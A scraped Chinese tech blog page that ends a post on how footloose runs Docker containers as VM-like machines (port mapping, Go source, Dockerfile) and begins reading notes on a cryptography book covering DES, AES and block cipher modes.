<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ansible]<span class="comment"># footloose ssh root@node0</span></span><br><span class="line">Last login: Thu Sep 19 08:57:17 2019 from gateway</span><br><span class="line">[root@node0 ~]<span class="comment"># hostname</span></span><br><span class="line">node0</span><br><span class="line">[root@node0 ~]<span class="comment"># logout</span></span><br><span class="line">Connection to localhost closed.</span><br></pre></td></tr></table></figure>
<h3 id="Host-端口映射"><a href="#Host-端口映射" class="headerlink" title="Host 端口映射"></a>Host 端口映射</h3><p>在容器使用的过程中，我们通常需要跑一些对外提供端口的服务，这时候就需要进行 Host 端口映射，先来看下 footloose 的配置文件，这里我们指定了 machine的数量是 2，并且指定了容器的 22 端口映射到 host 的 2222端口，依次递增：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cluster:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">cluster</span></span><br><span class="line"><span class="attr">  privateKey:</span> <span class="string">cluster-key</span></span><br><span class="line"><span class="attr">machines:</span></span><br><span class="line"><span class="attr">- count:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">  spec:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">quay.io/footloose/centos7</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">node%d</span></span><br><span class="line"><span class="attr">    portMappings:</span></span><br><span class="line"><span class="attr">    - containerPort:</span> <span class="number">22</span></span><br><span class="line"><span class="attr">      hostPort:</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure>
<p>创建对应 machine 资源：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran simple-hostPort]<span class="comment"># footloose create</span></span><br><span class="line">INFO[0000] Creating SSH key: cluster-key ...            </span><br><span class="line">INFO[0000] Pulling image: quay.io/footloose/centos7 ... </span><br><span class="line">INFO[0013] Creating machine: cluster-node0 ...          </span><br><span class="line">INFO[0014] Creating machine: cluster-node1 ...</span><br></pre></td></tr></table></figure>
<p>通过 netstat 查看 Host 端口情况，这里可以看到 footloose 使用的是 docker 作为容器管理入口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran simple-hostPort]<span class="comment"># netstat -antp |grep 222</span></span><br><span class="line">tcp6       0      0 :::2222                 :::*                    LISTEN      42227/docker-proxy  </span><br><span class="line">tcp6       0      0 :::2223                 :::*                    LISTEN      42540/docker-proxy</span><br></pre></td></tr></table></figure>
<p>这时候就可以使用普通的 ssh 命令连接到容器中了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran simple-hostPort]<span class="comment"># ssh root@127.0.0.1 -p 2222 -i cluster-key hostname</span></span><br><span class="line">The authenticity of host <span class="string">'[127.0.0.1]:2222 ([127.0.0.1]:2222)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:a6w9oFXMxjPCIXV42C44ogH9uaOILQiAdo/nlGdOnoc.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is MD5:6b:a8:78:08:78:63:d4:26:b8:11:9e:3c:31:24:ad:6e.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>[127.0.0.1]:2222<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">node0</span></span><br><span class="line"><span class="string">[root@yiran simple-hostPort]# ssh root@127.0.0.1 -p 2223 -i cluster-key hostname</span></span><br><span class="line"><span class="string">The authenticity of host '</span>[127.0.0.1]:2223 ([127.0.0.1]:2223)<span class="string">' can'</span>t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:o5cVIJ1MBlw/J/OcNcjZxjqogiIVe03HhU0ZYZEuyPM.</span><br><span class="line">ECDSA key fingerprint is MD5:06:a6:4f:09:4c:23:1e:17:ee:f6:fe:f1:fd:35:e1:ba.</span><br><span class="line">Are you sure you want to <span class="built_in">continue</span> connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added <span class="string">'[127.0.0.1]:2223'</span> (ECDSA) to the list of known hosts.</span><br><span class="line">node1</span><br><span class="line">[root@yiran simple-hostPort]<span class="comment"># footloose show</span></span><br><span class="line">NAME            HOSTNAME   PORTS      IP           IMAGE                       CMD          STATE     BACKEND</span><br><span class="line">cluster-node0   node0      2222-&gt;22   172.17.0.2   quay.io/footloose/centos7   /sbin/init   Running   </span><br><span class="line">cluster-node1   node1      2223-&gt;22   172.17.0.3   quay.io/footloose/centos7   /sbin/init   Running</span><br></pre></td></tr></table></figure>
<p>写了三个使用场景，那么我们来看看 footloose 是怎么实现的。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>machine 创建：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CreateMachine creates and starts a new machine in the cluster.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cluster)</span> <span class="title">CreateMachine</span><span class="params">(machine *Machine, i <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	name := machine.ContainerName()</span><br><span class="line"></span><br><span class="line">	publicKey, err := c.publicKey(machine) # 获取当前主机的公钥</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	cmd := <span class="string">"/sbin/init"</span>                    # 指定容器运行命令</span><br><span class="line">	<span class="keyword">if</span> machine.spec.Cmd != <span class="string">""</span> &#123;</span><br><span class="line">		cmd = machine.spec.Cmd</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> machine.IsIgnite() &#123;                # 判断 backend</span><br><span class="line">		...</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;                              </span><br><span class="line">		runArgs := c.createMachineRunArgs(machine, name, i)</span><br><span class="line">		_, err := docker.Create(machine.spec.Image,</span><br><span class="line">			runArgs,</span><br><span class="line">			[]<span class="keyword">string</span>&#123;cmd&#125;,</span><br><span class="line">		)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(machine.spec.Networks) &gt; <span class="number">1</span> &#123; # 当容器有多个网络配置时，依次进行 bridge 连接</span><br><span class="line">			<span class="keyword">for</span> _, network := <span class="keyword">range</span> machine.spec.Networks[<span class="number">1</span>:] &#123;</span><br><span class="line">				log.Infof(<span class="string">"Connecting %s to the %s network..."</span>, name, network)</span><br><span class="line">				<span class="keyword">if</span> network == <span class="string">"bridge"</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> err := docker.ConnectNetwork(name, network); err != <span class="literal">nil</span> &#123;</span><br><span class="line">						<span class="keyword">return</span> err</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> err := docker.ConnectNetworkWithAlias(name, network, machine.Hostname()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">						<span class="keyword">return</span> err</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> err := docker.Start(name); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Initial provisioning.</span></span><br><span class="line">		<span class="keyword">if</span> err := containerRunShell(name, initScript); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> err := <span class="built_in">copy</span>(name, publicKey, <span class="string">"/root/.ssh/authorized_keys"</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解这看下 <code>createMachineRunArgs</code> 里面的实现：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cluster)</span> <span class="title">createMachineRunArgs</span><span class="params">(machine *Machine, name <span class="keyword">string</span>, i <span class="keyword">int</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">	runArgs := []<span class="keyword">string</span>&#123; # 根据已有参数，进行 docker 的命令行拼接</span><br><span class="line">		<span class="string">"-it"</span>,</span><br><span class="line">		<span class="string">"--label"</span>, <span class="string">"works.weave.owner=footloose"</span>,</span><br><span class="line">		<span class="string">"--label"</span>, <span class="string">"works.weave.cluster="</span> + c.spec.Cluster.Name,</span><br><span class="line">		<span class="string">"--name"</span>, name,</span><br><span class="line">		<span class="string">"--hostname"</span>, machine.Hostname(),</span><br><span class="line">		<span class="string">"--tmpfs"</span>, <span class="string">"/run"</span>,              # 注意这里传入的参数部分</span><br><span class="line">		<span class="string">"--tmpfs"</span>, <span class="string">"/run/lock"</span>,</span><br><span class="line">		<span class="string">"--tmpfs"</span>, <span class="string">"/tmp:exec,mode=777"</span>,</span><br><span class="line">		<span class="string">"-v"</span>, <span class="string">"/sys/fs/cgroup:/sys/fs/cgroup:ro"</span>, </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, volume := <span class="keyword">range</span> machine.spec.Volumes &#123; # 卷挂载</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, mapping := <span class="keyword">range</span> machine.spec.PortMappings &#123; # 端口映射</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> machine.spec.Privileged &#123;</span><br><span class="line">		runArgs = <span class="built_in">append</span>(runArgs, <span class="string">"--privileged"</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(machine.spec.Networks) &gt; <span class="number">0</span> &#123; # 网络连接</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> runArgs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是，在 docker 命令行最终执行时，添加了 <code>--tmpfs /run --tmpfs /run/lock --tmpfs /tmp:exec,mode=777</code> 参数，并且将 Host 的 cgroup 配置路径通过只读权限传递给了容器，后面有用到。</p>
<p>其他的启动，停止，删除等操作也都是拼接为 docker 的命令行然后执行处理的，这里不过多描述。</p>
<p>那么有个问题，在容器内部，pid 为1 的进程应该是我们运行容器时传递的参数，也就时说，当我们执行的进程结束时，容器也就退出了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ~]<span class="comment"># docker run centos sleep 6000</span></span><br><span class="line">Unable to find image <span class="string">'centos:latest'</span> locally</span><br><span class="line">latest: Pulling from library/centos</span><br><span class="line">d8d02d457314: Already exists </span><br><span class="line">Digest: sha256:307835c385f656ec2e2fec602cf093224173c51119bbebd602c53c3653a3d6eb</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> centos:latest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新开 termimal</span></span><br><span class="line">[root@yiran ~]<span class="comment"># docker ps |grep -i centos</span></span><br><span class="line">6337dc1ad054        centos                      <span class="string">"sleep 6000"</span>        13 minutes ago      Up 13 minutes                              heuristic_haibt</span><br><span class="line">[root@yiran ~]<span class="comment"># docker exec -it  6337dc1ad054 bash</span></span><br><span class="line">[root@6337dc1ad054 /]<span class="comment"># ps -ef</span></span><br><span class="line">UID         PID   PPID  C STIME TTY          TIME CMD</span><br><span class="line">root          1      0  0 10:29 ?        00:00:00 sleep 6000</span><br><span class="line">root         23      0  3 10:43 pts/0    00:00:00 bash</span><br><span class="line">root         36     23  0 10:43 pts/0    00:00:00 ps -ef</span><br></pre></td></tr></table></figure>
<p>来看下 footloose 创建的 machine 是如何保证容器持久运行的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ansible]<span class="comment"># </span></span><br><span class="line">[root@yiran ansible]<span class="comment"># docker ps </span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">[root@yiran ansible]<span class="comment"># footloose create</span></span><br><span class="line">INFO[0000] Docker Image: quay.io/footloose/centos7:0.6.1 present locally </span><br><span class="line">INFO[0000] Creating machine: cluster-node0 ...          </span><br><span class="line">[root@yiran ansible]<span class="comment"># footloose show</span></span><br><span class="line">NAME            HOSTNAME   PORTS       IP           IMAGE                             CMD          STATE     BACKEND</span><br><span class="line">cluster-node0   node0      32773-&gt;22   172.17.0.2   quay.io/footloose/centos7:0.6.1   /sbin/init   Running   docker</span><br><span class="line">[root@yiran ansible]<span class="comment"># docker ps </span></span><br><span class="line">CONTAINER ID        IMAGE                             COMMAND             CREATED             STATUS              PORTS                   NAMES</span><br><span class="line">8ba9af085e53        quay.io/footloose/centos7:0.6.1   <span class="string">"/sbin/init"</span>        8 seconds ago       Up 7 seconds        0.0.0.0:32773-&gt;22/tcp   cluster-node0</span><br><span class="line">[root@yiran ansible]<span class="comment"># footloose ssh node0</span></span><br><span class="line">[root@node0 ~]<span class="comment"># ps -ef</span></span><br><span class="line">UID         PID   PPID  C STIME TTY          TIME CMD</span><br><span class="line">root          1      0  0 10:46 ?        00:00:00 /sbin/init</span><br><span class="line">root         17      1  0 10:46 ?        00:00:00 /usr/lib/systemd/systemd-journald</span><br><span class="line">root         50      1  0 10:46 ?        00:00:00 /usr/sbin/sshd -D</span><br><span class="line">root         58     50  0 10:46 ?        00:00:00 sshd: root@pts/1</span><br><span class="line">dbus         60      1  0 10:46 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation</span><br><span class="line">root         61      1  0 10:46 ?        00:00:00 /usr/lib/systemd/systemd-logind</span><br><span class="line">root         62     58  0 10:46 pts/1    00:00:00 -bash</span><br><span class="line">root         75     62  0 10:46 pts/1    00:00:00 ps -ef</span><br></pre></td></tr></table></figure>
<p>可以看到在 machine 中， pid 为1 的进程是 init，这个初始化参数是写死在代码里面的，因为 machine 中存在 init 进程，也就保证了我们之后的进程都是在 init 进程树下的，我们可以通过 systemd 对服务进行管理，直到我们的从容器外部将容器杀死。</p>
<p>前面使用过程中，一直忽略了一点，就是我们的容器镜像内部有什么不同么？看下 Dockerfile 里面的内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">master ✗ $ cat Dockerfile          </span><br><span class="line">FROM centos:7 <span class="comment"># base 镜像是 centos7</span></span><br><span class="line"></span><br><span class="line">ENV container docker</span><br><span class="line"></span><br><span class="line">RUN yum -y install sudo procps-ng net-tools iproute iputils wget &amp;&amp; yum clean all <span class="comment"># 安装必要的debug 工具</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 centos7 中，init 切换为 systemd 管理，针对容器中删除部分 systemd 配置</span></span><br><span class="line">RUN (<span class="built_in">cd</span> /lib/systemd/system/sysinit.target.wants/; <span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> [ <span class="variable">$i</span> == \</span><br><span class="line">systemd-tmpfiles-setup.service ] || rm -f <span class="variable">$i</span>; <span class="keyword">done</span>); \</span><br><span class="line">rm -f /lib/systemd/system/multi-user.target.wants/*;\</span><br><span class="line">rm -f /etc/systemd/system/*.wants/*;\</span><br><span class="line">rm -f /lib/systemd/system/<span class="built_in">local</span>-fs.target.wants/*; \</span><br><span class="line">rm -f /lib/systemd/system/sockets.target.wants/*udev*; \</span><br><span class="line">rm -f /lib/systemd/system/sockets.target.wants/*initctl*; \</span><br><span class="line">rm -f /lib/systemd/system/basic.target.wants/*;\</span><br><span class="line">rm -f /lib/systemd/system/anaconda.target.wants/*;\</span><br><span class="line">rm -f /lib/systemd/system/*.wants/*update-utmp*;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为了支持 ssh 连接，安装 openssh</span></span><br><span class="line">RUN yum -y install openssh-server &amp;&amp; yum clean all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露 22 端口</span></span><br><span class="line">EXPOSE 22</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.freedesktop.org/wiki/Software/systemd/ContainerInterface/</span></span><br><span class="line">STOPSIGNAL SIGRTMIN+3</span><br><span class="line"></span><br><span class="line">CMD [<span class="string">"/bin/bash"</span>]</span><br></pre></td></tr></table></figure>
<p>可以看到 footloose 支持的镜像在官方的 CentOS7 的基础上进行了部分配置，比如 systemd、openssh、端口暴露等，来让容器更像是一台虚拟机。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>为了方便的进行持续集成，我们引入了容器；为了更方便的进行调试/测试，我们让容器装作虚拟机的样子，也是无奈。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/weaveworks/footloose" target="_blank" rel="noopener">https://github.com/weaveworks/footloose</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/09/14/《图解密码技术》读书笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/《图解密码技术》读书笔记/" itemprop="url">《图解密码技术》读书笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-14T17:07:41+08:00">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/09/14/《图解密码技术》读书笔记/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/09/14/《图解密码技术》读书笔记/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己对于密码技术相关的知识一直都是零散的，刚接触 k8s 的时候遇到了好多证书问题都是靠临时搜索解决的，不成体系。</p>
<p><a href="https://liqiang.io/" target="_blank" rel="noopener">liqiang</a> 同学推荐了《图解密码技术》，趁着中秋假期看完了做了读书笔记，记录一下。</p>
<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="环游密码世界"><a href="#环游密码世界" class="headerlink" title="环游密码世界"></a>环游密码世界</h3><p>口令：password, passcode, pin<br>编码：encode<br>密码：cryptography  </p>
<p>对称密码是指在加密和解密时使用同一密钥的方式。  </p>
<p>公钥密码是指在加密和解密时使用不同密钥的方式，又称为非对称加密。  </p>
<p>将对称密码和公钥密码结合起来的密码方式称为混合密码系统。  </p>
<p>单项散列函数，用于保证完整性：“数据时正确的而不是伪造的”，没有被篡改过。  </p>
<p>数字签名能够保证数据不会被篡改，也防止发送者的否认。  </p>
<p>伪随机数生成器是一种能够模拟产生随机数列的算法，同时承担着密钥生成的重要职责。</p>
<img src="/2019/09/14/《图解密码技术》读书笔记/1.png" title="img1">
<p>隐写术隐藏的是消息本身，而密码隐藏的是内容，应用场景：数字水印。</p>
<p>密码与信息安全常识：</p>
<ol>
<li>不要使用保密的密码算法</li>
<li>使用低强度的密码比不进行任何加密更危险</li>
<li>任何密码总有一天都会被破解</li>
<li>密码只是信息安全的一部分</li>
</ol>
<h3 id="历史上的密码"><a href="#历史上的密码" class="headerlink" title="历史上的密码"></a>历史上的密码</h3><p>凯撒密码，通过平移字母顺序达到加密效果，平移字母个数为密钥。<br>简单替换密码，通过维护字母对照表达到加密效果。</p>
<p>密钥空间，所有可用密钥的总数就是密钥空间的大小，空间越大，暴力破解越困难。</p>
<p>频率分析破译：通过分析语言中高频使用字母及单词达到破译效果。</p>
<p>Enigma ：通过增加通信密码的方式保证安全性。<br>问题：</p>
<ol>
<li>通信密码连续输入2词并加密</li>
<li>通信密码是认为设定的</li>
<li>必须有每日密码本</li>
</ol>
<h3 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h3><p>将显示世界中的东西映射为比特序列的操作称为编码。</p>
<p>XOR，异或，相同为0 ，不同为1。</p>
<p>比特序列的异或，将明文 A 用密钥 B 进行加密，得到密文 A XOR B，将密文 A XOR B 用密钥 B 进行解密，得到明文 A。</p>
<p>一次性密码本，又称为维纳没密码，通过生成随机比特序列与明文异或加密。</p>
<p>理论上无法破解的原因：无法判断暴力破解的结果是否是争取的明文。<br>无法使用的原因：</p>
<ol>
<li>密钥的发送</li>
<li>密钥的保存，密钥长度与明文长度相等。</li>
<li>密钥的重用</li>
<li>密钥的同步</li>
<li>密钥的生成，需要真正的随机数</li>
</ol>
<p>DES（Data Encryption Standard），可被短时间破译，不推荐使用。</p>
<p>DES 将64 比特的明文加密成64比特的密文，密钥长度是56比特，从规格上说，DES 的密钥长度是64 比特，但由于每隔7 比特会设置一个用于错误校验的比特，因此实质上密钥长度是56比特。</p>
<p>DES 以每 64 比特的明文为最小单位进行加密，属于分组密钥的一种。</p>
<p>DES 结构，又称为 Feistel 网络，在很多密码算法中都有应用。</p>
<p>加密步骤：</p>
<ol>
<li>将输入的数据等分为左右两部分</li>
<li>将输入的右侧直接发送到输出的右侧</li>
<li>将输入的右侧发送到轮函数</li>
<li>轮函数根据右侧数据和子密钥，计算出一串看上去是随机的比特序列</li>
<li>将上一步得到的比特序列与左侧数据进行 XOR 运算，并将结果作为加密后的左侧</li>
<li>因为上述使用将右侧数据作为密钥的一部分，因此需要指定规则（如每两轮）对输入数据的左右进行数据对调</li>
</ol>
<p>DES 加密时无论使用任何函数作为轮函数都可以正确解密，也就是说，轮函数无需考虑解密的问题，可以被设计的任意复杂。</p>
<p>三重 DES，为了增加 DES 的强度，将DES 重复3次所得到的一种密码算法。</p>
<p>加密过程为：加密，解密，加密，这么做的目的是为了能够让三重DES 兼容普通的 DES。</p>
<p>AES（Advanced Encryption Standard）取代DES。通过评选，最终选择 Rijndael。</p>
<p>Rijndael 分组成都为 128 比特，密钥长度可以以32比特为单位在128 比特到256 比特的范围内进行选择，在AES 规格中，密钥长度只有 128，192，256 比特三种。</p>
<p>AES 使用 SPN 结构。<br>加密过程：</p>
<ol>
<li>SubBytes 处理，输入分组为 128 比特，16 字节，首先逐个字节的对16字节的输入数据进行SubBytes 处理，可以简单的理解为“简单替换密码” 中的 256 个字母的版本</li>
<li>ShiftRows 处理，将 SubBytes 的输出以字节为单位进行打乱处理，注意，打乱处理是有规律的</li>
<li>MixColumns 处理，对一个4字节的值进行比特运算，将其变为另一个4字节的值</li>
<li>AddRoundKey 处理，将 MixColumns 的输出与轮密钥进行XOR</li>
<li>重复上述4步，需要重复 10 - 14 轮计算。</li>
</ol>
<p>相比 Feistel 网络，SPN 优势：</p>
<ul>
<li>加密锁需要的轮数更少</li>
<li>所有处理均按照字节为单位进行，速度更快</li>
</ul>
<p>劣势：</p>
<ul>
<li>无法使用同一种结构实现加密和解密</li>
</ul>
<h3 id="分组密码的模式"><a href="#分组密码的模式" class="headerlink" title="分组密码的模式"></a>分组密码的模式</h3><p>分组密码是每次只能处理特定长度的一块数据的一类密码算法，一个分组的比特书就称为分组长度。</p>
<p>例如 DES 和三重 DES 的分组长度都是 64 比特，也就是会所一次只能加密64 比特的明文，并生成64 比特的密文。</p>
<p>当对一段很长的明文进行加密时，的呆的方法就称为分组密钥的模式。<br>主要模式有以下5种：</p>
<ul>
<li>ECB 模式，电子密码本模式</li>
<li>CBC 模式，密码分组链接模式</li>
<li>CFB 模式，密文反馈模式</li>
<li>OFB 模式，输出反馈模式</li>
<li>CTR 模式，计数器模式</li>
</ul>
<p>ECB 模式，将明文分组加密之后的结果直接称为密文分组，若分组内容小于分组长度时，则自动向上填充。</p>
<p>弱点：可以在步破译密文的情况下操纵明文。</p>
<p>CBC 模式，首先将明文分组与前一个密文分组进行 XOR 运算，然后再进行加密。</p>
